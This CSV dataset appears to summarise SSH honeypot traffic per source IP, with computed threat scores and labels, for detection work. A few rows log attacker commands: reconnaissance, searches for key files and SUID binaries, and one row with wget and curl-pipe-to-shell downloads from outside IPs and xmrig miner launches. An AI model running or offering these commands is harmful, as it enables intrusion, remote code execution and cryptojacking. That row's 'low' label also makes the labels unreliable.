src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score,anomaly_score,final_label,threat_tier
73.77.40.254,8,1,8,0,4,3,1,1,0,8,8,0,13.0,787.0,341.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,2.301169590643275,4.444444444444445,8.0,0.4032702219453248,0.40948106232494125,known_pattern,low
75.177.128.226,8,1,8,0,4,4,1,1,0,8,8,0,25.0,1334.0,818.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.6288156288156288,5.333333333333333,8.0,0.5207170727794885,0.3981122848354755,known_pattern,low
75.5.230.45,18,1,3,15,1,1,1,1,13,18,18,0,540.0,67656.0,55737.0,18,0,1,1,0,"['whoami', 'id', 'uptime', ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", 'free -m', 'cat /etc/hosts', 'ifconfig', 'arp -a', 'top -bn1 | head -20', 'ps -ef', 'ls -la /home/ubuntu/TaskBoard', 'ls /home/ubuntu/TaskBoard/frontend', 'exit']","whoami(1), id(1), uptime(1), sysctl -a 2>/dev/null | grep -i 'net\|kernel'(1), free -m(1)","whoami, id, uptime, sysctl -a 2>/dev/null | grep -i 'net\|kernel', free -m, cat /etc/hosts, ifconfig, arp -a, top -bn1 | head -20, ps -ef",13,0,0,0,0.1578947368421052,0.7894736842105263,0.75,6.5,1.2138218091786572,6.631578947368421,7.6103500761035,0.1177082085220668,0.5593124597808372,known_pattern,low
76.102.134.71,10,1,10,0,6,6,1,1,0,10,10,0,2.0,249.0,1421.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,0.1751054852320675,5.454545454545454,10.0,0.503217189063752,0.43357135408225966,known_pattern,low
76.165.206.93,7,1,7,0,3,3,1,1,0,7,7,0,13.0,2971.0,238.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,12.430962343096237,5.25,7.0,0.5099118987187984,0.4330300361581352,known_pattern,low
76.235.245.246,8,1,8,0,4,4,1,1,0,8,8,0,27.0,2200.0,417.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,5.2631578947368425,5.333333333333333,8.0,0.483301247705906,0.4049717166189024,known_pattern,low
76.9.20.152,5,1,5,0,1,1,1,1,0,5,5,0,4.0,888.0,1195.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,0.7424749163879598,5.833333333333333,5.0,0.3313865733734913,0.46166094289702214,known_pattern,low
76.97.222.47,5,1,5,0,1,1,1,1,0,5,5,0,6.0,2281.0,608.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,3.745484400656815,5.0,5.0,0.452681576990448,0.4263353640587742,known_pattern,low
78.131.99.41,8,1,8,0,4,4,1,1,0,8,8,0,18.0,2924.0,1270.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,2.3005507474429585,4.444444444444445,8.0,0.430547035314456,0.4144447613964525,known_pattern,low
78.70.224.80,10,1,10,0,6,6,1,1,0,10,10,0,30.0,1329.0,1228.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,1.081366965012205,4.545454545454546,10.0,0.5043857799218449,0.4193239375322332,known_pattern,low
79.72.156.117,6,1,6,0,2,2,1,1,0,6,6,0,11.0,1480.0,1458.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.0143934201507885,4.285714285714286,6.0,0.4118129990405929,0.4097697403483621,known_pattern,low
8.70.86.64,11,1,11,0,6,7,1,1,0,11,11,0,6.0,2143.0,901.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,2.3758314855875837,5.5,11.0,0.5061078320362545,0.43855830795800194,known_pattern,low
8.77.239.54,9,1,9,0,4,5,1,1,0,9,9,0,19.0,1345.0,1364.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,0.9853479853479854,4.5,9.0,0.5033496570118372,0.4097151664420869,known_pattern,low
80.110.109.39,11,1,11,0,5,7,1,1,0,11,11,0,26.0,611.0,701.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5833333333333333,0.0,0.8703703703703703,4.583333333333333,11.0,0.4788246989361214,0.4477613202271685,known_pattern,low
80.139.185.131,7,1,7,0,3,2,1,1,0,7,7,0,6.0,2284.0,1333.0,7,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.712143928035982,6.125,7.0,0.4945442068697055,0.4462996557946571,known_pattern,low
82.186.235.246,11,1,11,0,7,6,1,1,0,11,11,0,14.0,1428.0,627.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,2.2738853503184715,5.5,11.0,0.5217294961535589,0.4385538717200682,known_pattern,low
84.176.221.115,10,1,10,0,5,6,1,1,0,10,10,0,6.0,2937.0,1401.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,2.094864479315264,6.363636363636363,10.0,0.4694321326434166,0.4562819543225015,known_pattern,low
84.93.166.101,9,1,9,0,4,4,1,1,0,9,9,0,19.0,318.0,715.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.6,0.0,0.4441340782122905,4.5,9.0,0.5732486548726358,0.41725208609043085,known_pattern,low
86.127.200.2,10,1,10,0,5,5,1,1,0,10,10,0,5.0,1155.0,1440.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,0.8015267175572519,6.363636363636363,10.0,0.415936003504221,0.45349316644983145,known_pattern,low
86.77.63.189,29,1,4,25,2,2,1,1,23,29,29,1,783.0,3933.0,3614.0,29,0,1,1,0,"['who', 'cat /etc/os-release', 'cat /etc/hostname', 'uname -a', 'w', 'dmesg | tail -20', ""mount | grep -v 'tmpfs\\|cgroup'"", 'df -h', 'free -m', ""cat /proc/cpuinfo | grep 'model name' | head -1"", 'arp -a', 'ip a', 'cat /etc/hosts', 'wget -qO- ipinfo.io', 'ss -antp', 'ps aux | grep -v grep', 'ps aux', 'pstree -a', ""find / -name '*.key' 2>/dev/null | head -10"", 'ls -la /root', 'ls -la /home/ubuntu/TaskBoard', 'find / -perm -4000 -type f 2>/dev/null', 'logout']","who(1), cat /etc/os-release(1), cat /etc/hostname(1), uname -a(1), w(1)","who, cat /etc/os-release, cat /etc/hostname, uname -a, w, dmesg | tail -20, mount | grep -v 'tmpfs\|cgroup', df -h, free -m, cat /proc/cpuinfo | grep 'model name' | head -1",23,1,1,0,0.1333333333333333,0.8333333333333334,0.6,11.5,1.087966804979253,6.9,7.246467347168256,0.1413974633269893,0.6211986982872825,suspicious_activity,medium
87.182.231.243,5,1,5,0,1,1,1,1,0,5,5,0,13.0,1390.0,1270.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.093627065302911,5.0,5.0,0.3527862511749574,0.428964265349109,known_pattern,low
87.186.247.169,7,1,7,0,3,3,1,1,0,7,7,0,15.0,2552.0,1459.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.747945205479452,5.25,7.0,0.4337737040621097,0.4091691546996691,known_pattern,low
87.251.60.203,11,1,11,0,7,7,1,1,0,11,11,0,26.0,2776.0,1054.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.4166666666666666,0.0,2.6312796208530806,4.583333333333333,11.0,0.4776052661070734,0.46400243363060306,known_pattern,low
87.45.32.237,28,1,5,23,3,3,1,1,19,28,28,2,289.0,114512.0,716.0,0,28,1,1,0,"['last | head -20', 'id', 'journalctl -n 50 --no-pager', 'nproc', 'dmesg | tail -20', 'cat /proc/version', 'netstat -antp', 'ip route show', 'cat /etc/resolv.conf', 'ss -tulnp', 'ps aux | grep -v grep', 'ls -la /proc/ | head -20', 'ps -ef', 'pstree -a', 'cat /proc/1/cmdline', 'ls /home/ubuntu/TaskBoard/frontend', ""find / -name '*.key' 2>/dev/null | head -10"", 'ls -la /root', 'exit']","last | head -20(1), id(1), journalctl -n 50 --no-pager(1), nproc(1), dmesg | tail -20(1)","last | head -20, id, journalctl -n 50 --no-pager, nproc, dmesg | tail -20, cat /proc/version, netstat -antp, ip route show, cat /etc/resolv.conf, ss -tulnp",19,0,0,0,0.1724137931034483,0.7931034482758621,0.5,9.5,159.70990237099025,5.931034482758621,8.272601930273783,0.1507830028740973,0.6440859312775609,suspicious_activity,medium
89.181.16.220,5,1,5,0,1,1,1,1,0,5,5,0,6.0,1674.0,377.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,4.428571428571429,5.833333333333333,5.0,0.4721430331562996,0.4495634675310364,known_pattern,low
89.198.69.111,23,1,5,18,3,3,1,1,16,23,23,1,829.0,65325.0,44818.0,0,0,1,1,0,"['cat /etc/os-release', 'whoami', 'last | head -20', 'uname -s -r', 'cat /etc/hostname', 'ls /home', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls /', 'ls -la /var/tmp', 'bash /tmp/install.sh > /dev/null 2>&1 &', 'wget http://185.220.101.42/payload.sh -O /tmp/payload.sh', 'wget -q http://45.142.212.100/setup.sh -P /tmp/', 'curl -fsSL http://176.97.66.164/b.sh | sh', 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', 'disconnect']","cat /etc/os-release(1), whoami(1), last | head -20(1), uname -s -r(1), cat /etc/hostname(1)","cat /etc/os-release, whoami, last | head -20, uname -s -r, cat /etc/hostname, ls /home, ls -la /home/ubuntu/TaskBoard/Backend/, ls /, ls -la /var/tmp, bash /tmp/install.sh > /dev/null 2>&1 &",16,3,1,0,0.2083333333333333,0.75,0.5,8.0,1.4575291728954238,5.125,7.128393735278316,0.1477888341955804,0.5427054124930681,known_pattern,low
89.31.254.30,8,1,8,0,4,4,1,1,0,8,8,0,2.0,2322.0,1224.0,8,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.8955102040816327,6.222222222222222,8.0,0.5364831295631539,0.44683855708253006,known_pattern,low
9.244.238.231,7,1,7,0,3,3,1,1,0,7,7,0,9.0,328.0,130.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,2.50381679389313,5.25,7.0,0.5127814632851093,0.40734592953418053,known_pattern,low
9.46.62.191,5,1,5,0,1,1,1,1,0,5,5,0,21.0,1366.0,157.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,8.645569620253164,5.0,5.0,0.4276851744570981,0.4537558456853982,known_pattern,low
9.8.179.160,10,1,10,0,5,6,1,1,0,10,10,0,14.0,2477.0,633.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,3.906940063091483,6.363636363636363,10.0,0.5098259889224286,0.44289041568950355,known_pattern,low
90.119.197.193,9,1,9,0,5,5,1,1,0,9,9,0,22.0,514.0,1055.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,0.4867424242424242,5.4,9.0,0.4102846220236119,0.4147680863524615,known_pattern,low
90.79.139.230,6,1,6,0,2,2,1,1,0,6,6,0,27.0,2719.0,453.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,5.988986784140969,5.142857142857143,6.0,0.4431665955139488,0.4382323878843657,known_pattern,low
90.82.127.34,6,1,6,0,2,2,1,1,0,6,6,0,9.0,1629.0,1475.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,1.103658536585366,5.142857142857143,6.0,0.4153612268980899,0.41676351238754966,known_pattern,low
90.90.34.68,6,1,6,0,2,2,1,1,0,6,6,0,13.0,2451.0,832.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.942376950780312,6.0,6.0,0.6462365259484862,0.4422129452762776,known_pattern,low
92.26.103.155,10,1,10,0,6,6,1,1,0,10,10,0,24.0,2677.0,209.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.4545454545454546,0.0,12.747619047619049,4.545454545454546,10.0,0.463336633845601,0.45490137895527044,known_pattern,low
92.34.98.229,1,1,1,0,0,0,1,1,0,1,1,0,0.0,0.0,0.0,0,0,1,1,0,[],none,none,0,0,0,0,0.5,0.0,1.0,0.0,0.0,2.5,0.0,0.0,0.6670277338740048,suspicious_activity,medium
93.31.76.189,10,1,10,0,5,6,1,1,0,10,10,0,28.0,816.0,1474.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909092,0.0,0.5454545454545454,0.0,0.5532203389830509,4.545454545454546,10.0,0.497256937351356,0.4187688647794739,known_pattern,low
94.4.158.17,8,1,8,0,3,4,1,1,0,8,8,0,7.0,1582.0,1017.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,1.5540275049115913,4.444444444444445,8.0,0.484844798721799,0.40593567172441114,known_pattern,low
98.18.92.115,5,1,5,0,1,1,1,1,0,5,5,0,20.0,1998.0,104.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,19.02857142857143,4.166666666666667,5.0,0.550510334544568,0.49267712742870284,known_pattern,low
99.151.93.228,11,1,11,0,6,7,1,1,0,11,11,0,26.0,1819.0,752.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,2.415670650730412,5.5,11.0,0.4364124260197166,0.43547422563815913,known_pattern,low
99.164.186.64,6,1,6,0,2,2,1,1,0,6,6,0,16.0,2889.0,1283.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.25,6.0,6.0,0.5812958579346543,0.43805350994624104,known_pattern,low
